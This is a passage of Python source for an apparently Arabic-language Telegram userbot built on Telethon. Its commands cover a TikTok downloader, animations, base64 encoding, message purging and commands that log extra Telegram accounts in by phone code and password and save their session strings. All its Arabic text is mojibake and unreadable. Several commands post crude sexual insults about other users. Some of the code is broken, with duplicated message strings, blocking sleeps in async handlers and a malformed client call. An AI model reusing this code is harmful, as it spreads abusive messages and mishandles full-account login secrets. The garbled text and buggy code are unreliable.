        await edit_or_reply(HuReevent, f"ÿÆÿ∑ÿ£:\n{e}")

@client.on(events.NewMessage(pattern="ÿ™ŸäŸÉ ÿ™ŸàŸÉ(?: |$)(.*)"))
async def _(event):
    if event.fwd_from:
        return
    r_link = event.pattern_match.group(1)
    if ".com" not in r_link:
        await event.edit("**‚ñæ‚àÆ Ÿäÿ¨ÿ® Ÿàÿ∂ÿπ ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÅŸäÿØŸäŸà ŸÖÿπ ÿßŸÑÿßŸÖÿ± ÿßŸàŸÑÿß **")
    else:
        await event.edit("**‚ñæ‚àÆ ÿ™ÿ™ŸÖ ÿßŸÑŸÖÿπÿßŸÑÿ¨ÿ© ÿßŸÜÿ™ÿ∏ÿ± ŸÇŸÑŸäŸÑÿß**")
    chat = "@ttsavebot"
    async with bot.conversation(chat) as conv:
        try:
            msg_start = await conv.send_message("/start")
            r = await conv.get_response()
            msg = await conv.send_message(r_link)
            details = await conv.get_response()
            video = await conv.get_response()
            """ ŸÇŸÜÿßÿ© ÿßŸäŸÅÿß  @S21S6 """
            await bot.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await event.edit("‚ñæ‚àÆ ÿßŸÑÿ∫ŸÄŸä ÿ≠ŸÄÿ∏ÿ± ŸáŸÄÿ∞ÿß ÿßŸÑÿ®ŸÄŸàÿ™ Ÿà ÿ≠ŸÄÿßŸàŸÑ ŸÖÿ¨ŸÄÿØÿØÿß @ttsavebot")
            return
        await bot.send_file(event.chat_id, video)
        await event.client.delete_messages(
            conv.chat_id, [msg_start.id, r.id, msg.id, details.id, video.id]
        )
        await event.delete()
phone_number_pending = None
phone_code_hash_pending = None
new_client = None 
@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿ¨ŸÑÿ≥ÿ© (.+)$"))
async def add_session(event):
    global phone_number_pending, phone_code_hash_pending, new_client
    phone_number = event.pattern_match.group(1)
    phone_number_pending = phone_number
    
    new_client = TelegramClient(StringSession(), api_id, api_hash)
    await new_client.connect()

    if not await new_client.is_user_authorized():
        sent_code = await new_client.send_code_request(phone_number)
        phone_code_hash_pending = sent_code.phone_code_hash
        await event.respond('**‚ñ™Ô∏é|ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÉŸàÿØ. ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÉŸàÿØ ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ£ŸÖÿ± `.ÿ±ŸÖÿ≤ <ÿßŸÑŸÉŸàÿØ>` (ŸÖÿπ ŸÖÿ≥ÿßŸÅÿ© ÿ®ŸäŸÜ ÿßŸÑÿ£ÿ±ŸÇÿßŸÖ)**', parse_mode="markdown")

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿ±ŸÖÿ≤ (.+)$"))
async def add_code(event):
    global phone_number_pending, phone_code_hash_pending, new_client 
    if phone_number_pending is None:
        await event.respond('**‚ñ™Ô∏é|ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ ÿ£ŸàŸÑÿßŸã ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ£ŸÖÿ± `.ÿ¨ŸÑÿ≥ÿ© <ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ>`**', parse_mode="markdown")
        return

    code = event.pattern_match.group(1).replace(" ", "") 
    try:
        await new_client.sign_in(phone_number_pending, code, phone_code_hash=phone_code_hash_pending)
        save_session(new_client, phone_number_pending)
        await event.respond(f'**‚ñ™Ô∏é|ÿ™ŸÖÿ™ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ¨ŸÑÿ≥ÿ© ŸÑÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ {phone_number_pending} ÿ®ŸÜÿ¨ÿßÿ≠‚úÖÔ∏è', parse_mode="markdown")
        phone_number_pending = None
        phone_code_hash_pending = None
        new_client = None 
    except SessionPasswordNeededError:
        await event.respond('**‚ñ™Ô∏é|Ÿäÿ™ÿ∑ŸÑÿ® Ÿáÿ∞ÿß ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ™ÿ≠ŸÇŸÇ ÿ®ÿÆÿ∑Ÿàÿ™ŸäŸÜ. ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ± ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ£ŸÖÿ± `.ÿ™ÿ≠ŸÇŸÇ <ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ±>`**', parse_mode="markdown")
    except Exception as e:
        await event.respond(f'ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ¨ŸÑÿ≥ÿ©: {str(e)}')

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿ™ÿ≠ŸÇŸÇ (.+)$"))
async def add_password(event):
    global phone_number_pending, new_client
    if phone_number_pending is None:
        await event.respond('**‚ñ™Ô∏é|ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ ÿ£ŸàŸÑÿßŸã ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ£ŸÖÿ± `.ÿ¨ŸÑÿ≥ÿ© <ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ>`**', parse_mode="markdown")
        return

    password = event.pattern_match.group(1)
    try:
        await new_client.sign_in(phone_number_pending, password=password)  
        save_session(new_client, phone_number_pending)
        await event.respond(f'**‚ñ™Ô∏é|ÿ™ŸÖÿ™ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ¨ŸÑÿ≥ÿ© ŸÑÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ {phone_number_pending} ÿ®ŸÜÿ¨ÿßÿ≠‚úÖÔ∏è**', parse_mode="markdown")
        phone_number_pending = None
        new_client = None
    except Exception as e:
        await event.respond(f'**‚ñ™Ô∏é|ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ¨ŸÑÿ≥ÿ©: {e}**', parse_mode="markdown")

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ∑ÿ®ÿßÿπÿ© (.+)'))
async def ple(event):
    orig_text = event.pattern_match.group(1)
    text = orig_text
    pb = ""
    typing_symbol = "‚ñí"
    while(pb != orig_text):
        try:
            await event.edit(pb + typing_symbol)
            time.sleep(0.05)
            pb += text[0]
            text = text[1:]
            await event.edit(pb)
            time.sleep(0.05)
        except Exception as e:
            print(e)

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿ¥ÿ±ÿ∑ÿ©$"))
async def police(event):
    if event.fwd_from:
        return
    animation_ttl = range(0, 12)
    await event.edit("Police")
    animation_chars = [
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        "üîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥\nüîµüîµüîµ‚¨ú‚¨ú‚¨úüî¥üî¥üî¥",
        "üî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ\nüî¥üî¥üî¥‚¨ú‚¨ú‚¨úüîµüîµüîµ",
        " **Police iz Here**",
    ]
    for i in animation_ttl:
        await asyncio.sleep(0.5)
        await event.edit(animation_chars[i % 12])

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ÿ™ÿ¥ŸÅŸäÿ±$'))
async def runb64(event):
    await event.edit("wait...")
    options = event.message.raw_text.split()
    selectsecretmessage = await event.get_reply_message()
    try:
        if options[1] == "en":
            secretmessage = selectsecretmessage.message
            secretmessagebytes = secretmessage.encode("ascii")
            encodesecretmessage = base64.b64encode(secretmessagebytes)
            encodesecretmessagebytes = encodesecretmessage.decode("ascii")
            await event.edit("ÿßŸÑÿ™ÿ¥ŸÅŸäÿ±...")
            sleep(2)
            await event.edit(f"{encodesecretmessagebytes}")
        elif options[1] == "de":
            secretkey = selectsecretmessage.message
            secretkeybytes = secretkey.encode("ascii")
            decodesecretkey = base64.b64decode(secretkeybytes)
            decodesecretkeybytes = decodesecretkey.decode("ascii")
            await event.edit("ŸÅŸÉ ÿßŸÑÿ™ÿ¥ŸÅŸäÿ±...")
            sleep(2)
            await event.edit(f"ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖŸÅŸÉŸÉÿ©: {decodesecretkeybytes}")
        else:
            await event.edit("ÿÆÿ∑ÿ£!!!")
    except IndexError:
        await event.edit("ŸÑŸÉÿ™ÿßÿ®ÿ© ÿ™ÿ±ŸÖŸäÿ≤ ÿßŸà ŸÅŸÉ ÿßŸÑÿ™ÿ±ŸÖŸäÿ≤ ÿßŸÉÿ™ÿ® .ÿ™ÿ¥ŸÅŸäÿ± ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©")
    except:
        await event.edit("ÿ®ÿπÿ∂ ÿßŸÑÿßÿÆÿ∑ÿßÿ°!!!") 

@client.on(events.NewMessage(pattern="^/purge"))
async def purge(event):
    chat = event.chat_id
    msgs = []

    if not await is_administrator(user_id=event.sender_id, message=event):
        await event.reply("ÿßŸÜŸÄÿ™ ŸÑÿ≥ŸÄÿ™ ÿßÿØŸÖŸÄŸÜ!")
        return

    msg = await event.get_reply_message()
    if not msg:
        await event.reply("ŸÇŸÄŸÖ ÿ®ÿßŸÑŸÄÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÄÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™ŸÄŸä ÿ™ÿ±ŸäŸÄÿØ ÿ≠ÿ∞ŸÅ ÿßŸÑŸÄÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿ™ŸÄŸä ÿ™ÿ≠ŸÄÿ™Ÿáÿß.")
        return

    try:
        msg_id = msg.id
        count = 0
        to_delete = event.message.id - 1
        await tgbot.delete_messages(chat, event.message.id)
        msgs.append(event.reply_to_msg_id)
        for m_id in range(to_delete, msg_id - 1, -1):
            msgs.append(m_id)
            count += 1
            if len(msgs) == 100:
                await tgbot.delete_messages(chat, msgs)
                msgs = []

        await tgbot.delete_messages(chat, msgs)
        del_res = await event.client(
            event.chat_id, f"ÿ™ŸÜÿ∏ŸäŸÅ ÿ≥ÿ±Ÿäÿπ {count} ÿ±ÿ≥ÿßŸÑÿ© ."
        )

        await asyncio.sleep(4)
        await del_res.delete()

    except MessageDeleteForbiddenError:
        text = "ÿÆŸÄÿ∑ÿ£ ŸÅŸä ÿ≠ŸÄÿ∞ŸÅ ÿßŸÑŸÄÿ±ÿ≥ÿßÿ¶ŸÑ.\n"
        text += "ÿßŸÑŸÄÿ±ÿ≥ÿßŸÑŸá ŸÇÿØ ÿ™ŸÉŸàŸÜ ŸÇÿØŸäŸÖÿ© ÿßŸà ŸÑŸäÿ≥ŸÄÿ™ ŸÑÿØŸäŸÄŸÉ ÿµŸÑÿßÿ≠ŸÄŸäÿßÿ™ ÿßŸÑŸÄÿ≠ÿ∞ŸÅ"
        del_res = await event.reply(text, parse_mode="md")
        await asyncio.sleep(5)
        await del_res.delete()


@client.on(events.NewMessage(pattern="^/del$"))
async def delete_msg(event):

    if not await is_administrator(user_id=event.sender_id, message=event):
        await event.reply("ÿßŸÜŸÄÿ™ ŸÑŸÄÿ≥ÿ™ ÿßÿØŸÖŸÄŸÜ!")
        return

    chat = event.chat_id
    msg = await event.get_reply_message()
    if not msg:
        await event.reply("ŸÇŸÄŸÖ ÿ®ÿßŸÑŸÄÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÄÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™ŸÄŸä ÿ™ÿ±ŸäŸÄÿØ ÿ≠ÿ∞ŸÅ ÿßŸÑŸÄÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿ™ŸÄŸä ÿ™ÿ≠ŸÄÿ™Ÿáÿß")
        return
    to_delete = event.message
    chat = await event.get_input_chat()
    rm = [msg, to_delete]
    await tgbot.delete_messages(chat, rm)
    
@client.on(events.NewMessage(pattern=".ÿ±ŸÅÿπ ŸÖÿ±ÿ™Ÿä(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"üöª ** ‚éôÔ∏ô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ => ‚Ä¢ ** [{JoKeRUB}](tg://user?id={user.id}) \n ‚òëÔ∏è **‚éôÔ∏ô ÿ™ŸÖ ÿ±ŸÅÿπŸáÿß ŸÖÿ±ÿ™ŸÉ ÿ®Ÿàÿßÿ≥ÿ∑Ÿá :**{my_mention} üë∞üèº‚Äç‚ôÄÔ∏è.\n**‚éôÔ∏ô ŸäŸÑÿß ÿ≠ÿ®Ÿäÿ®Ÿä ÿßŸÖÿ¥Ÿä ŸÜÿÆŸÑŸÅ ÿ®Ÿäÿ®Ÿä üë∂üèªü§§** ")

@client.on(events.NewMessage(pattern=".ÿ±ŸÅÿπ ÿ¨ŸÑÿ®(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    if user.id == 8115539074:
        return await event.edit("**- ŸÑŸÉŸÉ ÿØŸä Ÿáÿ∞ÿß ÿßŸÑŸÖÿ∑Ÿàÿ±**")
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**‚éôÔ∏ô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ** [{JoKeRUB}](tg://user?id={user.id}) \n**‚éôÔ∏ô ÿ™ŸÄŸÖ ÿ±ŸÅÿπŸÄŸá ÿ¨ŸÑÿ® üê∂ ÿ®Ÿàÿßÿ≥ÿ∑ÿ© :** {my_mention} \n**‚éôÔ∏ô ÿÆŸÑŸäŸá ÿÆŸÑŸá ŸäŸÜÿ®ÿ≠ üòÇ**ÿ≥ÿ™ÿÆÿØŸÖ** [{JoKeRUB}](tg://user?id={user.id}) \n**‚éôÔ∏ô ÿ™ŸÄŸÖ ÿ±ŸÅÿπŸÄŸá ÿ¨ŸÑÿ® üê∂ ÿ®Ÿàÿßÿ≥ÿ∑ÿ© :** {my_mention} \n**‚éôÔ∏ô ÿÆŸÑŸäŸá ÿÆŸÑŸá ŸäŸÜÿ®ÿ≠ üòÇ**")

@client.on(events.NewMessage(pattern="ÿ≤Ÿàÿßÿ¨(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f""
    await event.edit(f"‚éôÔ∏ô ŸÑŸÇÿØ ÿ™ŸÖ ÿ≤Ÿàÿßÿ¨ŸÉ/ÿ¨ ŸÖŸÜ :  üíç\n‚éôÔ∏ô ÿßŸÑŸÅ ÿßŸÑŸÅ ŸÖÿ®ÿ±ŸàŸÉ ÿßŸÑÿßŸÜ ŸäŸÖŸÉŸÜŸÉ ÿßÿÆÿ∞ ÿ±ÿßÿ≠ÿ™ŸÉ ")

@client.on(events.NewMessage(pattern=".ÿ±ŸÅÿπ ÿßÿ®ŸÜ ŸÇÿ≠ÿ®ÿ©(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    if user.id == 8115539074:
        return await event.edit("**- ŸÑŸÉŸÉ ÿØŸä Ÿáÿ∞ÿß ÿßŸÑŸÖÿ∑Ÿàÿ±**")
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**‚éôÔ∏ô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ** [{JoKeRUB}](tg://user?id={user.id}) \n**‚éôÔ∏ô ÿ™ŸÄŸÄŸÖ ÿ±ŸÅŸÄŸÄÿπŸÄŸÄÿ© ÿßÿ®ŸÄŸÄŸÜ ŸÇŸÄŸÄÿ≠ŸÄŸÄÿ®ŸÄŸÄÿ© üñï ÿ®Ÿàÿßÿ≥ÿ∑ÿ© :** {my_mention} \n**‚éôÔ∏ô ÿÆŸÑŸäŸá Ÿäÿ±ÿ∂ÿπ ŸÖŸÜ ÿ≤ÿ®ŸÉ üòÇ**ÿ≥ÿ™ÿÆÿØŸÖ** [{JoKeRUB}](tg://user?id={user.id}) \n**‚éôÔ∏ô ÿ™ŸÄŸÄŸÖ ÿ±ŸÅŸÄŸÄÿπŸÄŸÄÿ© ÿßÿ®ŸÄŸÄŸÜ ŸÇŸÄŸÄÿ≠ŸÄŸÄÿ®ŸÄŸÄÿ© üñï ÿ®Ÿàÿßÿ≥ÿ∑ÿ© :** {my_mention} \n**‚éôÔ∏ô ÿÆŸÑŸäŸá Ÿäÿ±ÿ∂ÿπ ŸÖŸÜ ÿ≤ÿ®ŸÉ üòÇ**")
    

@client.on(events.NewMessage(pattern="ŸÉÿ™ÿßÿ®ÿ©(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑÿßŸÖÿ± ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠**")
    await event.edit(f"**ÿ™ŸÖ ÿ®ÿØÿ° Ÿàÿ∂ÿπ ÿßŸÑŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸàŸáŸÖŸäÿ© ŸÑŸÄ {t} ŸÖŸÜ ÿßŸÑÿ´ŸàÿßŸÜŸÄŸä**")
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(t)

@client.on(events.NewMessage(pattern="ÿßŸÑÿ±ÿßÿ®ÿ∑$"))
async def _(e):
    rr = await edit_or_reply(e, "**Ÿäÿ™ŸÖ ÿ¨ŸÑÿ® ÿßŸÑÿ±ÿßÿ®ÿ∑ ÿßŸÜÿ™ÿ∏ÿ± **")
    try:
        r = await e.client(
            ExportChatInviteRequest(e.chat_id),
        )
    except no_admin:
        return await eod(rr, "ÿπÿ∞ÿ±ÿß ÿßŸÜÿ™ ŸÑÿ≥ÿ™ ŸÖÿ¥ÿ±ŸÅ ŸÅŸä Ÿáÿ∞Ÿá ÿßŸÑÿØÿ±ÿØÿ¥ÿ©", time=10)
    await eod(rr, f"- ÿ±ÿßÿ®ÿ∑ ÿßŸÑÿØÿ±ÿØÿ¥ÿ©\n {r.link}")
        
HuRe_Bosa = ["ÿ±Ÿàÿ≠ ŸÑÿπŸÜÿØ ÿßŸÑŸÖÿ∑Ÿàÿ± ŸàŸÇŸàŸÑ ŸÑŸá", "ÿßŸäÿπ ŸÖŸÇÿ±ŸÅ", "ŸáŸÖŸÖŸÖŸÖŸÖŸÖ"]

@client.on(events.NewMessage(pattern=".ÿ®Ÿàÿ≥ÿ©$"))
async def ithker(knopis):
    await knopis.edit(random.choice(HuRe_Bosa))

DevJoker = [8115539074]

HuRe_5erok = [
    "** ‚ÄéŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÇÿ∂ÿßÿ° ŸäŸàŸÖ ŸÉÿßŸÖŸÑ ŸÖÿπ ÿßŸÑÿ±Ÿäÿßÿ∂Ÿä ÿßŸÑÿ∞Ÿä ÿ™ÿ¥ÿ¨ÿπŸá ÿ£Ÿà ŸÜÿ¨ŸÖ ÿßŸÑÿ≥ŸäŸÜŸÖÿß ÿßŸÑÿ∞Ÿä ÿ™ÿ≠ÿ®Ÿáÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ£ÿ≥ÿ¶ŸÑÿ© ŸÖÿ≠ÿ±ÿ¨ÿ© ÿ£ÿ≥ÿ¶ŸÑÿ© ÿµÿ±ÿßÿ≠ÿ© ŸÖÿßÿ∞ÿß ÿ≥ÿ™ÿÆÿ™ÿßÿ±ÿü **",
    "** ŸáŸÑ ŸÉÿ∞ÿ®ÿ™ ÿπŸÑŸâ ŸàÿßŸÑÿØŸäŸÉ ŸÖŸÜ ŸÇÿ®ŸÑ..ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ•ŸÖŸÉÿßŸÜŸäÿ© ÿ™Ÿàÿßÿ¨ÿØŸÉ ŸÅŸä ÿßŸÑŸÅÿ∂ÿßÿ° Ÿàÿ®ŸäŸÜ ÿ•ŸÖŸÉÿßŸÜŸäÿ© ÿ™Ÿàÿßÿ¨ÿØŸÉ ŸÅŸä ÿßŸÑÿ®ÿ≠ÿ±ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ£ÿ≥ÿ™ÿßÿ∞ ÿßŸÑŸÑÿ∫ÿ©  Ÿäÿ© ÿ£Ÿà ÿ£ÿ≥ÿ™ÿßÿ∞ ÿßŸÑÿ±Ÿäÿßÿ∂Ÿäÿßÿ™ÿü **",
    "** ÿ™ÿ≠ÿ≥ ÿßŸÜŸÉ ŸÖÿ≠ÿ∏Ÿàÿ∏ ÿ®ÿßŸÑÿßÿ¥ÿÆÿßÿµ ÿßŸÑŸä ÿ≠ŸàŸÑŸÉ ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÖÿ¥ÿßŸáÿØÿ© ŸÉÿ±ÿ© ÿßŸÑŸÇÿØŸÖ ÿ£Ÿà ŸÖÿ™ÿßÿ®ÿπÿ© ÿßŸÑÿ£ÿÆÿ®ÿßÿ±ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ™ŸÜÿßŸàŸÑ ÿßŸÑÿ¥ŸàŸÉŸàŸÑÿß ÿßŸÑÿ™Ÿä ÿ™ŸÅÿ∂ŸÑŸáÿß ŸÑŸÉŸÜ ŸÖÿπ ÿ•ÿ∂ÿßŸÅÿ© ÿ±ÿ¥ÿ© ŸÖŸÜ ÿßŸÑŸÖŸÑÿ≠ ŸàÿßŸÑŸÇŸÑŸäŸÑ ŸÖŸÜ ÿπÿµŸäÿ± ÿßŸÑŸÑŸäŸÖŸàŸÜ ÿ•ŸÑŸäŸáÿß ÿ£Ÿà ÿ™ŸÜÿßŸàŸÑ ŸÑŸäŸÖŸàŸÜÿ© ŸÉÿßŸÖŸÑÿ© ŸÉÿ®Ÿäÿ±ÿ© ÿßŸÑÿ≠ÿ¨ŸÖÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ£ŸÜ ÿ™ÿπŸäÿ¥ ŸÇÿµÿ© ŸÅŸäŸÑŸÖ ŸáŸÑ ÿ™ÿÆÿ™ÿßÿ± ÿßŸÑÿ£ŸÉÿ¥ŸÜ ÿ£Ÿà ÿßŸÑŸÉŸàŸÖŸäÿØŸäÿßÿü **",
    "** ŸÑŸà ŸÉŸÜÿ™ ÿ¥ÿÆÿµ ÿ¢ÿÆÿ± ŸáŸÑ ÿ™ŸÅÿ∂ŸÑ ÿßŸÑÿ®ŸÇÿßÿ° ŸÖÿπŸÉ ÿ£ŸÖ ÿ£ŸÜŸÉ ÿ≥ÿ™ÿ®ÿ™ÿπÿØ ÿπŸÜ ŸÜŸÅÿ≥ŸÉÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßŸÑÿßÿ≥ÿ™ŸÖÿßÿπ ÿ•ŸÑŸâ ÿßŸÑÿ£ÿÆÿ®ÿßÿ± ÿßŸÑÿ¨ŸäÿØÿ© ÿ£ŸàŸÑŸãÿß ÿ£Ÿà ÿßŸÑÿßÿ≥ÿ™ŸÖÿßÿπ ÿ•ŸÑŸâ ÿßŸÑÿ£ÿÆÿ®ÿßÿ± ÿßŸÑÿ≥Ÿäÿ¶ÿ© ÿ£ŸàŸÑŸãÿßÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßÿ±ÿ™ÿØÿßÿ° ŸÖŸÑÿßÿ®ÿ≥ ÿßŸÑÿ®Ÿäÿ™ ŸÑŸÖÿØÿ© ÿ£ÿ≥ÿ®Ÿàÿπ ŸÉÿßŸÖŸÑ ÿ£Ÿà ÿßÿ±ÿ™ÿØÿßÿ° ÿßŸÑÿ®ÿØŸÑÿ© ÿßŸÑÿ±ÿ≥ŸÖŸäÿ© ŸÑŸÜŸÅÿ≥ ÿßŸÑŸÖÿØÿ©ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ£ŸÜ ÿ™ÿ™ŸÉŸÑŸÖ ÿ®ÿßŸÑŸáŸÖÿ≥ ŸÅŸÇÿ∑ ÿ∑ŸàÿßŸÑ ÿßŸÑŸàŸÇÿ™ ÿ£Ÿà ÿ£ŸÜ ÿ™ÿµÿ±ÿÆ ŸÅŸÇÿ∑ ÿ∑ŸàÿßŸÑ ÿßŸÑŸàŸÇÿ™ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ÿ•ŸÜŸÇÿßÿ∞ ÿ¥ÿÆÿµ Ÿàÿßÿ≠ÿØ ŸÖÿπ ŸÜŸÅÿ≥ŸÉ ÿ®ŸäŸÜ ÿ£ŸÖŸÉ ÿ£Ÿà ÿßÿ®ŸÜŸÉÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßŸÑÿ®ŸÇÿßÿ° ÿ®ÿØŸàŸÜ Ÿáÿßÿ™ŸÅ ŸÑŸÖÿØÿ© ÿ¥Ÿáÿ± ÿ£Ÿà ÿ®ÿØŸàŸÜ ÿ•ŸÜÿ™ÿ±ŸÜÿ™ ŸÑŸÖÿØÿ© ÿ£ÿ≥ÿ®Ÿàÿπÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ±ÿ¨ŸÑ ÿ£ÿπŸÖÿßŸÑ ÿ£Ÿà ÿ£ŸÖŸäÿ±ÿü **",
